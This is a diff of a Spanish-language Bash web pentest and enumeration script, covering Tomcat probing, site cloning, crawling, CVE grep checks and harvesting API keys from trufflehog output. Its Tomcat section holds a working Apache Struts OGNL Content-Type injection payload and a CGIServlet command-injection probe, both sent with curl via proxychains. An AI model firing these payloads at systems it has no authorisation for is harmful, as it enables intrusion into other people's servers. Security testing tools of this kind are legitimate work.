@@ -560,8 +560,8 @@ function enumeracionTomcat () {
    port=$3  
    echo -e "\t\t[+] Enumerar Tomcat ($proto_http : $host : $port)"   
 
-   $proxychains curl --max-time 10 "$proto_http":"//$host":"$port/cgi/ism.bat?&dir"  >> logs/vulnerabilidades/"$host"_"$port"_CGIServlet.txt &   
-   $proxychains curl --max-time 10 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable $proto_http://$host:$port')).(#ros.flush())}" "$proto_http://$host:$port/" >> logs/vulnerabilidades/"$host"_"$port"_apacheStruts.txt 2>/dev/null&
+   $proxychains curl -k --max-time 10 "$proto_http":"//$host":"$port/cgi/ism.bat?&dir"  >> logs/vulnerabilidades/"$host"_"$port"_CGIServlet.txt &   
+   $proxychains curl -k --max-time 10 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable $proto_http://$host:$port')).(#ros.flush())}" "$proto_http://$host:$port/" >> logs/vulnerabilidades/"$host"_"$port"_apacheStruts.txt 2>/dev/null&
 
 	waitWeb 2.5
    	echo -e "\t\t[+] Revisando archivos genericos ($host - Tomcat)"
@@ -1264,24 +1264,16 @@ for line in $(cat $TARGETS); do
 			touch webTrack/$host/checksumsEscaneados.txt
 
 			if [[ ! -z "$URL" && "$MODE" == "total" ]];then
-				echo -e "\t[+] Clonandoss: $URL"
-				mkdir webClone/$host 2>/dev/null
-
-				rm resultado-httrack.txt 2>/dev/null				
+				echo -e "\t[+] Clonandos: $URL"
+				mkdir webClone/$host 2>/dev/null				
+				if [[ "$ESPECIFIC" == "1" ]];then					
+					echo "Descargar manualmente el sitio y guardar en $host"
+					read resp	
+				else
+					rm resultado-httrack.txt 2>/dev/null	
+					script --command "httrack $URL --user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36' -O webClone/$host" -O resultado-httrack.txt
+				fi			
 				
-				script --command "httrack $URL --user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36' -O webClone/$host" -O resultado-httrack.txt
-				
-				egrep -iq "403" resultado-httrack.txt
-				greprc=$?
-				if [[ $greprc -eq 0 ]] ; then
-					if [[ "$ESPECIFIC" == "1" ]];then
-						rm -rf webClone/$host
-						mkdir webClone/$host
-						echo "Descargar manualmente el sitio y guardar en $host"
-						read resp		
-					fi
-				fi
-
 				find webClone | egrep '\.html|\.js' | while read line
 				do
 					extractLinks.py "$line" | grep "$host" | awk -F"$host/" '{print $2}' >> directorios-personalizado2.txt
@@ -1465,8 +1457,8 @@ for line in $(cat $TARGETS); do
 						head -30 logs/enumeracion/"$host"_"$port"_webCrawledBlackwidow.txt > logs/vulnerabilidades/"$host"_"$port"_CS-01.txt
 						grep 'Telephone' logs/enumeracion/"$host"_"$port"_webCrawledBlackwidow.txt | sort | uniq > .enumeracion/"$host"_"$port"_telephones.txt
 						grep -i 'sub-domain' logs/enumeracion/"$host"_"$port"_webCrawledBlackwidow.txt | sort | uniq | awk {'print $4'} | httprobe.py > .enumeracion/"$host"_web_app2.txt
-						cat .enumeracion/"$host"_web_app2.txt servicios/webApp.txt | delete-duplicate-urls.py  > servicios/webApp2.txt
-						mv servicios/webApp2.txt servicios/webApp.txt
+						cat .enumeracion/"$host"_web_app2.txt servicios/webApp.txt 2>/dev/null | delete-duplicate-urls.py  > servicios/webApp2.txt
+						mv servicios/webApp2.txt servicios/webApp.txt 2>/dev/null 
 
 						sort logs/enumeracion/"$host"_"$port"_webCrawledKatana.txt |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g"  | uniq > logs/enumeracion/"$host"_"$port"_webCrawled.txt
 						grep Dynamic logs/enumeracion/"$host"_"$port"_webCrawledBlackwidow.txt |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" | awk {'print $5'} | uniq > logs/enumeracion/"$host"_"$port"_webCrawled.txt
@@ -1666,7 +1658,7 @@ if [[ $webScaneado -eq 1 ]]; then
 			grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port"_wordpressPlugins.txt > .vulnerabilidades/"$host"_"$port"_wordpressPlugins.txt 2>/dev/null
 			grep -i 'demo.sayHello' logs/vulnerabilidades/"$host"_"$port"_xml-rpc-habilitado.txt > .vulnerabilidades/"$host"_"$port"_xml-rpc-habilitado.txt 2>/dev/null
 			grep -i 'incorrect' logs/vulnerabilidades/"$host"_"$port"_xml-rpc-login.txt > .vulnerabilidades/"$host"_"$port"_xml-rpc-login.txt 2>/dev/null
-			grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port"_chamilo-CVE~2023~34960.txt > .vulnerabilidades/"$host"_"$port"_chamilo-CVE~2023~34960.txt
+			grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port"_chamilo-CVE~2023~34960.txt > .vulnerabilidades/"$host"_"$port"_chamilo-CVE~2023~34960.txt 2>/dev/null
 
 			grep --color=never "|" logs/enumeracion/"$host"_"$port"_hadoopNamenode.txt  2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .enumeracion/"$host"_"$port"_hadoopNamenode.txt 
 
@@ -1799,12 +1791,14 @@ if [[ $webScaneado -eq 1 ]]; then
 			while IFS= read -r line; do
 				#echo  $line
 				path_file=`echo $line | cut -d ',' -f1 | tr -d '"'| sed 's/ /\\ /g'`
-				keyword=`echo $line | cut -d ',' -f2 | tr -d '" '`
-				apikey=`grep -o  ".\{25\}$keyword.\{25\}" $path_file`					
-				if [[ (  ${apikey} != *"sha256"* && ${apikey} != *"sha512"* ) ]];then 
-					echo "$apikey:$path_file" >> ../../.vulnerabilidades/"$DOMINIO"_web_apiKey.txt
-				fi		
-				
+				if [[ (  ${path_file} != *"cookies"* && ${path_file} != *"cookies"* ) ]];then 
+					keyword=`echo $line | cut -d ',' -f2 | tr -d '" '`
+					echo "apikey $keyword"
+					apikey=`grep -o  ".\{25\}$keyword.\{25\}" $path_file|sort|uniq | head -1`
+					if [[ (  ${apikey} != *"sha256"* && ${apikey} != *"sha512"* ) ]];then 
+						echo "$apikey:$path_file" >> ../../.vulnerabilidades/"$DOMINIO"_web_apiKey.txt
+					fi	
+				fi									
 			done < ../../logs/vulnerabilidades/"$DOMINIO"_web_trufflehog2.txt
 			
 			# # AWS Secret Access Key
@@ -2334,7 +2328,7 @@ if [[ ! -z "$URL"  ]];then
 
 	if [[ "$MODE" == "total" ]]; then		
 		# CS-62 HTTP header injection
-		echo "\t[+]HTTP header injection"
+		echo -e "\t[+]HTTP header injection"
 		headi -u $URL > logs/vulnerabilidades/"$host"_"$port"_CS-62.txt
 		grep 'Vul' logs/vulnerabilidades/"$host"_"$port"_CS-62.txt > .vulnerabilidades/"$host"_"$port"_CS-62.txt		
 	fi	
